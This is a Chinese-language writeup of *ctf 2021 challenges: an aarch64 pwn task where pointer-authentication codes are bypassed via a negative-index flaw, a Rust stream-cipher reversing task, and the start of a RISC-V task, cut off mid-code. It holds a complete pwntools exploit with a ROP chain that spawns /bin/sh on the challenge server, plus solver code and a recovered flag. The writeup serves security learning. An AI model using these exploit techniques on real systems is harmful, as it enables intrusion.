---
title: starctf(*ctf)-2021 writeup
tags:
  - ctf
  - pwn
  - re
  - riscv
  - arm
categories:
  - writeup
date: 2021-01-23
excerpt: "*ctf 2021 writeup"
---

# 前言

| 更新时间  | 更新内容  |
|  ----     | ----      |
| 2021-01-23 | babypac, stream |
| 2021-01-29 | favorite architecture part1 |
| 2021-01-29 | favorite architecture part2 |
| 2021-02-03 | baby xv6 |

记录一下*ctf中做的和复现的几个题目.

官方 wp : https://github.com/sixstars/starctf2021 

---

# 正文

## pwn-babypac

一道 arm pwn:

```
Arch:     aarch64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

程序开始先读取32字节的`name`, 存在 bss 段中, 然后提供四个功能供我们选择:

```
=== BabyPAC ===
1. add
2. lock
3. show
4. auth
5. exit
>>
```

add 功能就是读取一个 32 位 int 型数字 `num` , 然后存到 bss 段的数组 `arr` 中

lock 功能会对 `arr` 中第 `i` 个 `num` 进行加密操作(也可能是 hash , 不确定是否可逆, 暂且称之为加密操作, 下文中我们用 `encode()` 指代进行加密操作的函数), 并替换原来的 `num` .

show 功能会打印 `arr` 中所有非 0 元素.

auth 功能会判断 `arr` 中第 `i` 个 `num` 和 `encode(0x10A9FC70042LL)` 的结果进行比较, 若相等则会调用一个危险函数(下文中我们用 `vuln()` 指代该函数), 该函数中包含一个栈溢出漏洞.

乍一看貌似很简单, 我们可以通过调试获取 `encode(0x10A9FC70042LL)` 的结果,然后将结果 add 到 `arr` 中, 再调用 auth 功能即可.

但是通过调试发现这个结果竟然每次都不一样, 经过分析发现问题出在了下面这条汇编指令上:

```
...
# 此时X8中的值为 0000010A9FC70042h
.text:0000000000400D68                 PACIA           X8, SP
# 此时X8中的值为 00XX010A9FC70042h, 其中XX为一个随机字节.
...
.text:0000000000400D8C                 BL              encode
```

关于 `pacia` 指令的详细信息参考 [ARM Compiler armasm User Guide Version 6.6](https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ) , 通俗点说, 这个指令进行了一个hash 操作, hash的输入有三个:

- 地址, 此处为 X8 中的值
- 上下文, 此处为 SP 中的值
- key , 在一个用户不可见的寄存器中, 每个进程都不一样

输出则为一个 64 bit 的密文, 然后对密文截断取一个字节(下文中我们用 auth_code 指代这一个随机字节), 放到 X8 中的第 7 字节中.

多说两句, 这个指令是属于 ARMv8.3 中引入的指针认证( Pointer Authentication )机制中的一个指令中, 更多相关指令和用法可以参考 [ARMv8.3 Pointer Authentication](https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf) . 这个机制的主要目的就是防止指针被篡改, 可以用来预防 rop 之类的攻击, 之后我们利用栈溢出漏洞进行 rop 的时候仍然需要绕过它.

既然随机只有一个字节, 那么我们完全可以进行爆破操作 1/256 的成功率还是可以接受的. 不过后来发现 lock 功能和 auth 功能中都没有考虑 index 为负数的情况, 而且恰好 `name` 是在 `arr` 的相邻低地址出, 因此我们可以在 `name` 中输入 `0x10A9FC70042` 然后对其进行 lock , 正好 lock 时的 sp 和 auth 中的 sp 是相同的, 因此计算得到的 auth_code 也是一样的, 自然就可以轻松通过校验, 走到 `vuln()` 函数中.  `vuln` 函数中有两个指令比较关键, 分别位于函数的开头和结尾

```
.text:0000000000400BDC                 PACIASP
...
.text:0000000000400C08                 RETAA
```

PACIASP ([PACIA, PACIZA, PACIA1716, PACIASP, PACIAZ -- arm文档](https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ))指令会使用 X30, SP, key 作为输出, 计算并截断得到一个字节的 auth_code , 填到 X30 的第 7 字节中( X30 也即 LR 寄存器, 其中存储着返回地址)

RETAA( [RETAA, RETAB -- arm 文档](https://developer.arm.com/documentation/dui0801/k/A64-General-Instructions/RETAA--RETAB?lang=en) )指令会校验 X30 中的 auth_code , 如果校验失败, 程序将会直接退出. 

这儿我一开始的思路是直接爆破, 毕竟只有一个字节. 但是经过 mqa 提醒发现可以利用 show 功能打印 lock 之后的地址, 从而通过校验. 经过实验发现 lock 中的`pacia` 指令和 `vuln()` 开头的 `paciasp` 指令执行时的上下文( sp )都一样, 因此结果自然也就一样, 我们就可以直接得到正确的 auth_code. 之后就是常规的 rop , rop 思路来自 [ARM64下ROP，以及调试技巧总结 -- csdn](https://blog.csdn.net/qq_39869547/article/details/105255683) (感谢X1do0的搜索), 感觉思路和X86下的 ret2csu 差不多. 最后 exp 如下:

```python
#coding:utf-8
from pwn import *
from time import sleep
import sys

global io
ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)
charset = []
for w in range(48, 58):
    charset.append(bytes([w]))
for w in range(65, 91):
    charset.append(bytes([w]))
for w in range(97, 123):
    charset.append(bytes([w]))

def bp(tail, sha, io):
    for char1 in charset:
        for char2 in charset:
            for char3 in charset:
                for char4 in charset:
                    _sha = hashlib.sha256(char1+char2+char3+char4+tail).hexdigest().encode()
                    if _sha == sha:
                        print(char1+char2+char3+char4+tail)
                        sla(io, 'Give me xxxx:\n', char1+char2+char3+char4)
                        break

# amd64 or x86
context(arch = 'aarch64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./chall"
ip = "52.255.184.147"
port = 8080

LOCAL = len(sys.argv)==1

elf = ELF(filename)
libc = ELF("./lib/libc.so.6")
libc.address = 0x4000844000

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return input(s)
    else:
        return input(s)

def choice(p, idx):
    sla(p, ">> ", str(idx))
    
def lg(name, val):
    log.info(name+" : "+hex(val))

def add(p, val):
    choice(p, 1)
    sla(p, "identity: ", str(val))

def lock(p, idx):
    choice(p, 2)
    sla(p, "idx: ", str(idx))

def show(p, idx):
    choice(p, 3)

def auth(p, idx):
    choice(p, 4)
    sla(p, "idx: ", str(idx))

# pause(io)

mapping = {    0x10217c8ccc5af919 : 0x400ff8,0x10a068a44d5af919 : 0x1000000400ff8,0x112354ddce5af919 : 0x2000000400ff8,0x11a240f54f5af919 : 0x3000000400ff8,0x12252c2ec85af919 : 0x4000000400ff8,0x12a43806495af919 : 0x5000000400ff8,0x1327047fca5af919 : 0x6000000400ff8,0x13a610574b5af919 : 0x7000000400ff8,0x1429ddc8c45af919 : 0x8000000400ff8,0x14a8c9e0455af919 : 0x9000000400ff8,0x152bf599c65af919 : 0xa000000400ff8,0x15aae1b1475af919 : 0xb000000400ff8,0x162d8d6ac05af919 : 0xc000000400ff8,0x16ac9942415af919 : 0xd000000400ff8,0x172fa53bc25af919 : 0xe000000400ff8,0x17aeb113435af919 : 0xf000000400ff8,0x18303e04dc5af919 : 0x10000000400ff8,0x18b12a2c5d5af919 : 0x11000000400ff8,0x19321655de5af919 : 0x12000000400ff8,0x19b3027d5f5af919 : 0x13000000400ff8,0x1a346ea6d85af919 : 0x14000000400ff8,0x1ab57a8e595af919 : 0x15000000400ff8,0x1b3646f7da5af919 : 0x16000000400ff8,0x1bb752df5b5af919 : 0x17000000400ff8,0x1c389f40d45af919 : 0x18000000400ff8,0x1cb98b68555af919 : 0x19000000400ff8,0x1d3ab711d65af919 : 0x1a000000400ff8,0x1dbba339575af919 : 0x1b000000400ff8,0x1e3ccfe2d05af919 : 0x1c000000400ff8,0x1ebddbca515af919 : 0x1d000000400ff8,0x1f3ee7b3d25af919 : 0x1e000000400ff8,0x1fbff39b535af919 : 0x1f000000400ff8,0x3f99cec5af919 : 0x20000000400ff8,0x82edb46d5af919 : 0x21000000400ff8,0x101d1cdee5af919 : 0x22000000400ff8,0x180c5e56f5af919 : 0x23000000400ff8,0x207a93ee85af919 : 0x24000000400ff8,0x286bd16695af919 : 0x25000000400ff8,0x305816fea5af919 : 0x26000000400ff8,0x38495476b5af919 : 0x27000000400ff8,0x40b58d8e45af919 : 0x28000000400ff8,0x48a4cf0655af919 : 0x29000000400ff8,0x5097089e65af919 : 0x2a000000400ff8,0x58864a1675af919 : 0x2b000000400ff8,0x60f087ae05af919 : 0x2c000000400ff8,0x68e1c52615af919 : 0x2d000000400ff8,0x70d202be25af919 : 0x2e000000400ff8,0x78c3403635af919 : 0x2f000000400ff8,0x812bb14fc5af919 : 0x30000000400ff8,0x893af3c7d5af919 : 0x31000000400ff8,0x9109345fe5af919 : 0x32000000400ff8,0x991876d7f5af919 : 0x33000000400ff8,0xa16ebb6f85af919 : 0x34000000400ff8,0xa97ff9e795af919 : 0x35000000400ff8,0xb14c3e7fa5af919 : 0x36000000400ff8,0xb95d7cf7b5af919 : 0x37000000400ff8,0xc1a1a50f45af919 : 0x38000000400ff8,0xc9b0e78755af919 : 0x39000000400ff8,0xd183201f65af919 : 0x3a000000400ff8,0xd992629775af919 : 0x3b000000400ff8,0xe1e4af2f05af919 : 0x3c000000400ff8,0xe9f5eda715af919 : 0x3d000000400ff8,0xf1c62a3f25af919 : 0x3e000000400ff8,0xf9d768b735af919 : 0x3f000000400ff8,0x306476ac8c5af919 : 0x40000000400ff8,0x30e562840d5af919 : 0x41000000400ff8,0x31665efd8e5af919 : 0x42000000400ff8,0x31e74ad50f5af919 : 0x43000000400ff8,0x3260260e885af919 : 0x44000000400ff8,0x32e13226095af919 : 0x45000000400ff8,0x33620e5f8a5af919 : 0x46000000400ff8,0x33e31a770b5af919 : 0x47000000400ff8,0x346cd7e8845af919 : 0x48000000400ff8,0x34edc3c0055af919 : 0x49000000400ff8,0x356effb9865af919 : 0x4a000000400ff8,0x35efeb91075af919 : 0x4b000000400ff8,0x3668874a805af919 : 0x4c000000400ff8,0x36e99362015af919 : 0x4d000000400ff8,0x376aaf1b825af919 : 0x4e000000400ff8,0x37ebbb33035af919 : 0x4f000000400ff8,0x387534249c5af919 : 0x50000000400ff8,0x38f4200c1d5af919 : 0x51000000400ff8,0x39771c759e5af919 : 0x52000000400ff8,0x39f6085d1f5af919 : 0x53000000400ff8,0x3a716486985af919 : 0x54000000400ff8,0x3af070ae195af919 : 0x55000000400ff8,0x3b734cd79a5af919 : 0x56000000400ff8,0x3bf258ff1b5af919 : 0x57000000400ff8,0x3c7d9560945af919 : 0x58000000400ff8,0x3cfc8148155af919 : 0x59000000400ff8,0x3d7fbd31965af919 : 0x5a000000400ff8,0x3dfea919175af919 : 0x5b000000400ff8,0x3e79c5c2905af919 : 0x5c000000400ff8,0x3ef8d1ea115af919 : 0x5d000000400ff8,0x3f7bed93925af919 : 0x5e000000400ff8,0x3ffaf9bb135af919 : 0x5f000000400ff8,0x2046f3bcac5af919 : 0x60000000400ff8,0x20c7e7942d5af919 : 0x61000000400ff8,0x2144dbedae5af919 : 0x62000000400ff8,0x21c5cfc52f5af919 : 0x63000000400ff8,0x2242a31ea85af919 : 0x64000000400ff8,0x22c3b736295af919 : 0x65000000400ff8,0x23408b4faa5af919 : 0x66000000400ff8,0x23c19f672b5af919 : 0x67000000400ff8,0x244e52f8a45af919 : 0x68000000400ff8,0x24cf46d0255af919 : 0x69000000400ff8,0x254c7aa9a65af919 : 0x6a000000400ff8,0x25cd6e81275af919 : 0x6b000000400ff8,0x264a025aa05af919 : 0x6c000000400ff8,0x26cb1672215af919 : 0x6d000000400ff8,0x27482a0ba25af919 : 0x6e000000400ff8,0x27c93e23235af919 : 0x6f000000400ff8,0x2857b134bc5af919 : 0x70000000400ff8,0x28d6a51c3d5af919 : 0x71000000400ff8,0x29559965be5af919 : 0x72000000400ff8,0x29d48d4d3f5af919 : 0x73000000400ff8,0x2a53e196b85af919 : 0x74000000400ff8,0x2ad2f5be395af919 : 0x75000000400ff8,0x2b51c9c7ba5af919 : 0x76000000400ff8,0x2bd0ddef3b5af919 : 0x77000000400ff8,0x2c5f1070b45af919 : 0x78000000400ff8,0x2cde0458355af919 : 0x79000000400ff8,0x2d5d3821b65af919 : 0x7a000000400ff8,0x2ddc2c09375af919 : 0x7b000000400ff8,0x2e5b40d2b05af919 : 0x7c000000400ff8,0x2eda54fa315af919 : 0x7d000000400ff8,0x2f596883b25af919 : 0x7e000000400ff8,0x2fd87cab335af919 : 0x7f000000400ff8,0x50ab68cc4c5af919 : 0x80000000400ff8,0x502a7ce4cd5af919 : 0x81000000400ff8,0x51a9409d4e5af919 : 0x82000000400ff8,0x512854b5cf5af919 : 0x83000000400ff8,0x52af386e485af919 : 0x84000000400ff8,0x522e2c46c95af919 : 0x85000000400ff8,0x53ad103f4a5af919 : 0x86000000400ff8,0x532c0417cb5af919 : 0x87000000400ff8,0x54a3c988445af919 : 0x88000000400ff8,0x5422dda0c55af919 : 0x89000000400ff8,0x55a1e1d9465af919 : 0x8a000000400ff8,0x5520f5f1c75af919 : 0x8b000000400ff8,0x56a7992a405af919 : 0x8c000000400ff8,0x56268d02c15af919 : 0x8d000000400ff8,0x57a5b17b425af919 : 0x8e000000400ff8,0x5724a553c35af919 : 0x8f000000400ff8,0x58ba2a445c5af919 : 0x90000000400ff8,0x583b3e6cdd5af919 : 0x91000000400ff8,0x59b802155e5af919 : 0x92000000400ff8,0x5939163ddf5af919 : 0x93000000400ff8,0x5abe7ae6585af919 : 0x94000000400ff8,0x5a3f6eced95af919 : 0x95000000400ff8,0x5bbc52b75a5af919 : 0x96000000400ff8,0x5b3d469fdb5af919 : 0x97000000400ff8,0x5cb28b00545af919 : 0x98000000400ff8,0x5c339f28d55af919 : 0x99000000400ff8,0x5db0a351565af919 : 0x9a000000400ff8,0x5d31b779d75af919 : 0x9b000000400ff8,0x5eb6dba2505af919 : 0x9c000000400ff8,0x5e37cf8ad15af919 : 0x9d000000400ff8,0x5fb4f3f3525af919 : 0x9e000000400ff8,0x5f35e7dbd35af919 : 0x9f000000400ff8,0x4089eddc6c5af919 : 0xa0000000400ff8,0x4008f9f4ed5af919 : 0xa1000000400ff8,0x418bc58d6e5af919 : 0xa2000000400ff8,0x410ad1a5ef5af919 : 0xa3000000400ff8,0x428dbd7e685af919 : 0xa4000000400ff8,0x420ca956e95af919 : 0xa5000000400ff8,0x438f952f6a5af919 : 0xa6000000400ff8,0x430e8107eb5af919 : 0xa7000000400ff8,0x44814c98645af919 : 0xa8000000400ff8,0x440058b0e55af919 : 0xa9000000400ff8,0x458364c9665af919 : 0xaa000000400ff8,0x450270e1e75af919 : 0xab000000400ff8,0x46851c3a605af919 : 0xac000000400ff8,0x46040812e15af919 : 0xad000000400ff8,0x4787346b625af919 : 0xae000000400ff8,0x47062043e35af919 : 0xaf000000400ff8,0x4898af547c5af919 : 0xb0000000400ff8,0x4819bb7cfd5af919 : 0xb1000000400ff8,0x499a87057e5af919 : 0xb2000000400ff8,0x491b932dff5af919 : 0xb3000000400ff8,0x4a9cfff6785af919 : 0xb4000000400ff8,0x4a1debdef95af919 : 0xb5000000400ff8,0x4b9ed7a77a5af919 : 0xb6000000400ff8,0x4b1fc38ffb5af919 : 0xb7000000400ff8,0x4c900e10745af919 : 0xb8000000400ff8,0x4c111a38f55af919 : 0xb9000000400ff8,0x4d922641765af919 : 0xba000000400ff8,0x4d133269f75af919 : 0xbb000000400ff8,0x4e945eb2705af919 : 0xbc000000400ff8,0x4e154a9af15af919 : 0xbd000000400ff8,0x4f9676e3725af919 : 0xbe000000400ff8,0x4f1762cbf35af919 : 0xbf000000400ff8,0x70ee62ec0c5af919 : 0xc0000000400ff8,0x706f76c48d5af919 : 0xc1000000400ff8,0x71ec4abd0e5af919 : 0xc2000000400ff8,0x716d5e958f5af919 : 0xc3000000400ff8,0x72ea324e085af919 : 0xc4000000400ff8,0x726b2666895af919 : 0xc5000000400ff8,0x73e81a1f0a5af919 : 0xc6000000400ff8,0x73690e378b5af919 : 0xc7000000400ff8,0x74e6c3a8045af919 : 0xc8000000400ff8,0x7467d780855af919 : 0xc9000000400ff8,0x75e4ebf9065af919 : 0xca000000400ff8,0x7565ffd1875af919 : 0xcb000000400ff8,0x76e2930a005af919 : 0xcc000000400ff8,0x76638722815af919 : 0xcd000000400ff8,0x77e0bb5b025af919 : 0xce000000400ff8,0x7761af73835af919 : 0xcf000000400ff8,0x78ff20641c5af919 : 0xd0000000400ff8,0x787e344c9d5af919 : 0xd1000000400ff8,0x79fd08351e5af919 : 0xd2000000400ff8,0x797c1c1d9f5af919 : 0xd3000000400ff8,0x7afb70c6185af919 : 0xd4000000400ff8,0x7a7a64ee995af919 : 0xd5000000400ff8,0x7bf958971a5af919 : 0xd6000000400ff8,0x7b784cbf9b5af919 : 0xd7000000400ff8,0x7cf78120145af919 : 0xd8000000400ff8,0x7c769508955af919 : 0xd9000000400ff8,0x7df5a971165af919 : 0xda000000400ff8,0x7d74bd59975af919 : 0xdb000000400ff8,0x7ef3d182105af919 : 0xdc000000400ff8,0x7e72c5aa915af919 : 0xdd000000400ff8,0x7ff1f9d3125af919 : 0xde000000400ff8,0x7f70edfb935af919 : 0xdf000000400ff8,0x60cce7fc2c5af919 : 0xe0000000400ff8,0x604df3d4ad5af919 : 0xe1000000400ff8,0x61cecfad2e5af919 : 0xe2000000400ff8,0x614fdb85af5af919 : 0xe3000000400ff8,0x62c8b75e285af919 : 0xe4000000400ff8,0x6249a376a95af919 : 0xe5000000400ff8,0x63ca9f0f2a5af919 : 0xe6000000400ff8,0x634b8b27ab5af919 : 0xe7000000400ff8,0x64c446b8245af919 : 0xe8000000400ff8,0x64455290a55af919 : 0xe9000000400ff8,0x65c66ee9265af919 : 0xea000000400ff8,0x65477ac1a75af919 : 0xeb000000400ff8,0x66c0161a205af919 : 0xec000000400ff8,0x66410232a15af919 : 0xed000000400ff8,0x67c23e4b225af919 : 0xee000000400ff8,0x67432a63a35af919 : 0xef000000400ff8,0x68dda5743c5af919 : 0xf0000000400ff8,0x685cb15cbd5af919 : 0xf1000000400ff8,0x69df8d253e5af919 : 0xf2000000400ff8,0x695e990dbf5af919 : 0xf3000000400ff8,0x6ad9f5d6385af919 : 0xf4000000400ff8,0x6a58e1feb95af919 : 0xf5000000400ff8,0x6bdbdd873a5af919 : 0xf6000000400ff8,0x6b5ac9afbb5af919 : 0xf7000000400ff8,0x6cd50430345af919 : 0xf8000000400ff8,0x6c541018b55af919 : 0xf9000000400ff8,0x6dd72c61365af919 : 0xfa000000400ff8,0x6d563849b75af919 : 0xfb000000400ff8,0x6ed15492305af919 : 0xfc000000400ff8,0x6e5040bab15af919 : 0xfd000000400ff8,0x6fd37cc3325af919 : 0xfe000000400ff8,0x6f5268ebb35af919 : 0xff000000400ff8,
}

start = 0x00400700
bss = 0x412050
fake_stack = 0x412800
name_addr = 0x412030
ptrs_addr = 0x412050
system_addr = libc.symbols['system'] 
binsh_addr = 0x412095
plt_read =  0x004006D0 
got_read = 0x0411FD8
got_puts = 0x00411FD0
got_printf = 0x0411FE0

server_offset = 0xe4000 + 0x4000844000

"""
w0 = w22
x1 = x23
x2 = x24
x3 = [X21+X19<<3] -> system

x19 = 0
x20 = 0
x21 = binsh_addr + 8
x22 = binsh_addr
x23 = 0
x24 = 0

x29 = stack_frame

"""

auth_ret = 0x3b
tmp = (auth_ret << 48) | 0x400FF8
print(f"[+] ret addr : {tmp:#x}")

rop_chain = b'a'*0x20 + flat(
    fake_stack, tmp, # fp, lr
    fake_stack, 0x0400FD8, # fp2, lr2
    0, 0, # x19, x20
    binsh_addr+8, binsh_addr, # x21, x22
    0, 0, # x23, x24
)

def debug():
    leak = False
    local = False
    if local:
        io = process(["qemu-aarch64", "-cpu", "max", "-L", ".", "./chall.bak"], aslr=False)
        # io = process(["qemu-aarch64", "-cpu", "max", "-g", "2234", "-L", ".", ".chall.bak"], aslr=False)
    else:
        io=remote("52.255.184.147", 8080)
        ru(io, '+')
        tail = rv(io, 16)
        ru(io, ' == ')
        sha = io.recvline(keepends=False)
        bp(tail, sha, io)

    sla(io, "name", flat(0x400FF8, 0, 0x10A9FC70042, 0)) # patched
    add(io, u32("%p\0\0"))
    lock(io, -2)
    lock(io, -1)
    show(io, 0)
    ru(io, "ame: ")
    enc_addr = u64(rv(io, 8))
    dec_addr = mapping[enc_addr]
    print(f"dec_addr : {dec_addr:#x}")
    auth(io, -1)

    # auth_ret = int(input("input auth_code : "), 16)
    tmp = dec_addr
    print(f"[+] ret addr : {tmp:#x}")
    if not leak:
        # write name
        rop_chain = b'a'*0x20 + flat(
            fake_stack, tmp, # fp, lr
            fake_stack, 0x0400FD8, # fp2, lr2
            0, 1, # x19, x20
            got_read, 0, # x21, x22
            name_addr, 0x100, # x23, x24
            
            fake_stack, 0x0400FD8, # fp2, lr2
            0, 1, # x19, x20
            name_addr+8, name_addr, # x21, x22
            name_addr, 0x100, # x23, x24
        )
        sleep(1)
        sl(io, rop_chain)
        sleep(1)
        if local:
            sl(io, flat(b"/bin/sh\0", system_addr))
        else:
            sl(io, flat(b"/bin/sh\0", system_addr-0xc000))
        io.interactive()

    else:
        # write got
        rop_chain = b'a'*0x20 + flat(
            fake_stack, tmp, # fp, lr
            fake_stack, 0x0400FD8, # fp2, lr2
            0, 0, # x19, x20
            got_puts, got_puts, # x21, x22
            got_puts, 0x100, # x23, x24
        )
        sleep(1)
        sl(io, rop_chain)
        sleep(1)
        puts_addr = rv(io, 3)
        print(puts_addr.hex())

res = debug()
```

其中mapping用来从编码后的地址查找编码前的地址, ~~因为太长我就删掉了~~. 使用如下程序生成:

```c
//test.c
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <inttypes.h>
#include <assert.h>     

void hexdump(unsigned char* buf, size_t size) {
    int i,j;
    for (i = 0;i < size;i += 16)
    {
        printf("%08x:", i);
        for (j = i;j < size && j < i + 16;j++)
        {
            printf(" %02x", buf[j]);
        }
        puts("");
    }
}

uint64_t encode(int64_t a1){
  return a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11)) << 31) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11) ^ ((a1 ^ (a1 << 7) ^ ((a1 ^ (uint64_t)(a1 << 7)) >> 11)) << 31)) >> 13);
}

int main(){
    int64_t a = 0x44010A9FC70042;
    uint64_t b= encode(a);
    printf("%#llx -> %#llx\n", (long long unsigned int)a, (long long unsigned int)b);
    printf("{");
    for (uint64_t i=0; i<0x100; i++){
        a = (i << 48) | 0x400FF8;
        b = encode(a);
        printf("    %#llx : %#llx,\n", (long long unsigned int)b, (long long unsigned int)a);
    }
    printf("}\n");
	return 0;
}
```

第一次做出arm pwn. 还是挺有意思的, 最后也贴一下执行脚本和调试脚本:

```bash
# 执行脚本
qemu-aarch64 -cpu max -g 2234 -L . ./chall

# 调试脚本
gdb-multiarch -q \
  -ex 'set architecture aarch64' \
  -ex 'file chall.bak' \
  -ex 'target remote localhost:2234' \
  -ex 'break *0x400C00' \
  -ex 'break *0x400FF0' \
  -ex continue \
;
```

## re-stream

rust 逆向, 程序大致流程如下

1. 打开 flag 文件
2. 读取 flag 文件中的 flag
3. 对 flag 进行一通编码操作
4. 将结果写到 output 文件中

我们需要逆向编码逻辑, 然后从 output 中逆出 flag.

思路就是按字节爆破. 但是编码的过程中用到了一个随机数生成器:

```cpp
rand_chacha::guts::init_chacha
rand_chacha::guts::refill_wide
```

要想爆破的话也需要调用这两个函数, 因为对 rust 不是很熟悉, 所以花了很多时间研究如何调用这两个函数. 最后是通过直接改库的源码实现的....

直接 DFS 搜索即可:

```rust
use std::process::exit;
use rand_chacha::test;

const FLAG_SIZE: usize = 46;
const ENC: [u8; FLAG_SIZE]  = [0x3c, 0x2f, 0x9a, 0x41, 0xda, 0xfe, 0x9a, 0xa4, 0x5e, 0x4c, 0xa9, 0x1c, 0x89, 0x92, 0x96, 0xf5, 0x38, 0xee, 0x12, 0xdc, 0x1b, 0x98, 0xd, 0xf3, 0xdc, 0x42, 0x42, 0x72, 0x22, 0x2a, 0x60, 0x86, 0x91, 0xe3, 0x1, 0x14, 0xd4, 0x3, 0x18, 0x7a, 0xb8, 0x29, 0x18, 0xe8, 0xa1, 0x80, ];
// const ENC: [u8; FLAG_SIZE] = [0x1, 0xa2, 0x76, 0x27, 0x62, 0x14, 0x60, 0xe5, 0xe, 0x22, 0x26, 0xae, 0x60, 0xc1, 0x75, 0x44, 0x4f, 0x1b, 0xc4, 0xe6, 0x78, 0x64, 0x37, 0x6d, 0x89, 0xf6, 0xea, 0x5e, 0x1, 0x42, 0xb1, 0xcb, 0xb2, 0xbd, 0x32, 0x9a, 0x72, 0x61, 0xec, 0x55, 0xcc, 0x64, 0xbc, 0x61, 0xce, 0xcd, ];
const NONCE: [u8; 32] = [0 as u8; 32];

// 得到的答案需要重新排列一下
fn show(flag: &[u8; FLAG_SIZE]){
    for i in 0..FLAG_SIZE{
        let b = flag[i];
        if b == 0{break;}
        print!("{}", b as char);
    }
    println!("");
}

// dfs 搜索 flag
fn search(key: &mut [u8; 32], idx: usize, flag: &mut [u8; FLAG_SIZE]){
    if idx == FLAG_SIZE{
        println!("found flag");
        show(flag);
        exit(0);
    }
    
    for ch in 0x20..0x80{
        let old_key = key[idx&0x1f];
        let old_flag = flag[idx];
        key[idx&0x1f] = ch as u8;
        let res = test(key, &NONCE);
        let v1 = res[0];
        let v2 = v1 ^ ch as u8;

        if v2 == ENC[idx] {
            println!("[+] {} {} ({:#x} = {:#x} ^ {:#x} = {:#x})", idx, ch as u8 as char, ENC[idx], v1, ch as u8, v2);
            flag[idx] = ch as u8;
            search(key, idx+1, flag);
        }
        flag[idx] = old_flag;
        key[idx&0x1f] = old_key;
    }
}

fn main(){
    let mut key: [u8; 32] = [0; 32];
    let mut flag: [u8; FLAG_SIZE] = [0; FLAG_SIZE];
    search(&mut key, 0, &mut flag);
}

// *ctf{EbXZCOD56vEHNSofFvRHG7XtgFJXcUXUGnaaaaaa}
```

其中 `test` 是在 `rand_chacha` 库的源码中添加的代码:

```rust
pub fn test(key: &[u8; 32], nonce: &[u8]) -> [u8; BUFSZ] {
    let mut rng = init_chacha(key, nonce);
    let mut res: [u8; BUFSZ] = [0; BUFSZ];
    refill_wide(&mut rng, 10, &mut res);
    res
}
```

emmm , 最后还需要对结果重排一下, 不再赘述.



---

赛后看官方 wp 仓库中本题的源码发现对 rng 的使用很简单:

```rust
...
let mut rng = StdRng::from_seed(seed);
let r: u8 = rng.gen();
...
```



## re&pwn-favourite architecture

这是一个 riscv架构的题目, 一个环境三个题目, 先是一个逆向拿到第一个 flag , 然后是个栈溢出利用 orw 读出第二个 flag , 最后是一个修改 qemu-user 中的 got 表劫持控制流 getshell 拿到第三个 flag.

riscv 架构的题目可以使用 ghidra 9.2 进行反编译([ghidra官网](https://ghidra-sre.org/)). 调试的话使用原生 gdb+gef 插件远程调试即可, 偶尔会遇到 gef context 命令失败的情况, 不过不影响使用.

启动脚本加调试脚本如下

```bash
#直接启动
./qemu-riscv64 main

#调试启动
./qemu-riscv64 -g 1234 main

#调试脚本
#!/bin/sh

gdb-multiarch -q \
  -ex 'set architecture riscv:rv64' \
  -ex 'file main' \
  -ex 'target remote localhost:1234' \
  -ex 'break *0x10456' \
  -ex 'break *0x10464' \
  -ex 'b *0x104dc' \
;
```

反编译出现 unknown error 时得手动改 gp 为 `0x6f178`（ctrl-A → ctrl-R → 找到gp寄存器并修改）(感谢@X1do0发现的解决方案)
ghidra 的 entry 函数的最后对 gp 寄存器赋成了这个值(`0x6f178`), 后面 ghidra 又识别不出来了，得手动改成这个. 这个值也可以通过调试确定

后面两个pwn部分宇轩大佬的wp也总结的很清楚, 可以结合阅读: https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#



### first flag-reverse

binary 是静态编译+去符号的, 又是 riscv. 所以很多库函数认不出来.

赛后看源码发现其实就是把 flag 分成两部分(姑且称之为 flag_a, flag_b). 然后对 flag_a 用 chacha20 流密码算法进行加密, 对 flag_b 用 tea 算法(改了轮次)进行加密. 拿到题目后用 ida 的 findcrypt 插件可以发现有 salsa20 算法的特征, 但是并没有发现 tea 的特征. 后来分析的时候发现 tea 中的那个 0x9e3779b9 是通过下面两条指令生成的:

```asm
        000102d4 b7 87 37 9e     lui        a5,0x9e378 # a5 = signed_extend_to_64bit(0x9e378 << 12) = 0x9e378000
        000102d8 9b 87 97 9b     addiw      a5,a5,-0x647 # a5 = 0x9e3779b9
```

因为 riscv 中一个指令的长度只能是 2 字节或 4 字节, 所以对于一些 32 位的立即数就需要几条指令合作实现, 也就解释了 findcrypt 插件识别不到的原因.

题目还把 tea 算法改了一下, circle 从 32 轮改成了 16 轮, 我就直接把标准解码代码的轮次改成 16 次发现不行, 经过坤坤指点才意识到需要把 sum 也给改了, 改成16 轮时的 sum. 最终脚本如下:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>  
#include "chacha20.h"

#define flag1_len  0x29
#define flag2_len  0x30

# get the right `sum`
void tea_enc (uint32_t* v, uint32_t* k) {  
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */  
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */  
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */  
    for (i=0; i < 16; i++) {                       /* basic cycle start */  
        sum += delta;  
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);  
